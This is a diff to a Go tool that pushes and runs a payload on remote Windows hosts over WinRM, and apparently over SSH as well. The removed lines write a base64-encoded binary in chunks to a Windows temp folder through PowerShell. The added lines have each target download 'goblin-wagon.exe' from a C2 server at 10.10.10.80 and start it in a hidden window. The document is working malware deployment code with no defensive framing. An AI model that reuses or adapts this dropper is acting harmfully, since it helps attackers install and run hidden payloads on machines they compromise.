@@ -3,7 +3,6 @@ package main
 import (
 	_ "embed"
     "context"
-    "encoding/base64"
     "fmt"
     "io"
     "log"
@@ -255,40 +254,13 @@ func drop_and_run_ssh(client *ssh.Client, data []byte, ip string) error {
 }
 
 func drop_and_run_winrm(client *winrm.Client, data []byte, ip string) error {
-    encoded := base64.StdEncoding.EncodeToString(data)
-    tmpPath := `C:\Windows\Temp\goblin-wagon.exe`
-    chunkSize := 8000
-    totalChunks := (len(encoded) + chunkSize - 1) / chunkSize
-
-    log.Printf("[*] WinRM | %s | clearing existing payload", ip)
-    run_WinRM_cmds(client, fmt.Sprintf(`powershell -Command "Remove-Item -Force '%s' -ErrorAction SilentlyContinue"`, tmpPath))
-
-    log.Printf("[*] WinRM | %s | dropping %d bytes in %d chunks", ip, len(data), totalChunks)
-    for i := 0; i < len(encoded); i += chunkSize {
-        end := i + chunkSize
-        if end > len(encoded) {
-            end = len(encoded)
-        }
-        chunk := (i / chunkSize) + 1
-        log.Printf("[*] WinRM | %s | writing chunk %d/%d", ip, chunk, totalChunks)
-
-        cmd := fmt.Sprintf(`powershell -Command "$f=[System.Convert]::FromBase64String('%s'); $fs=[System.IO.File]::Open('%s',[System.IO.FileMode]::Append); $fs.Write($f,0,$f.Length); $fs.Close()"`,
-            encoded[i:end], tmpPath)
-        if err := run_WinRM_cmds(client, cmd); err != nil {
-            log.Printf("[-] WinRM | %s | chunk %d/%d failed: %v", ip, chunk, totalChunks, err)
-            return fmt.Errorf("chunk write failed: %v", err)
-        }
-    }
-    log.Printf("[+] WinRM | %s | binary dropped to %s", ip, tmpPath)
-
-    log.Printf("[*] WinRM | %s | executing payload", ip)
-    if err := run_WinRM_cmds(client, fmt.Sprintf(`powershell -Command "Start-Process '%s' -WindowStyle Hidden"`, tmpPath)); err != nil {
-        log.Printf("[-] WinRM | %s | execution failed: %v", ip, err)
+    // serve the binary from your C2 and have target pull it
+    cmd := `powershell -Command "Invoke-WebRequest -Uri 'http://10.10.10.80/goblin-wagon.exe' -OutFile 'C:\Windows\Temp\goblin-wagon.exe'"`
+    if err := run_WinRM_cmds(client, cmd); err != nil {
+        log.Printf("[-] WinRM | %s | download failed: %v", ip, err)
         return err
     }
-
-    log.Printf("[+] WinRM | %s | payload executing on target", ip)
-    return nil
+    return run_WinRM_cmds(client, `powershell -Command "Start-Process 'C:\Windows\Temp\goblin-wagon.exe' -WindowStyle Hidden"`)
 }
 
 //go:embed binaries/payload_linux_amd64
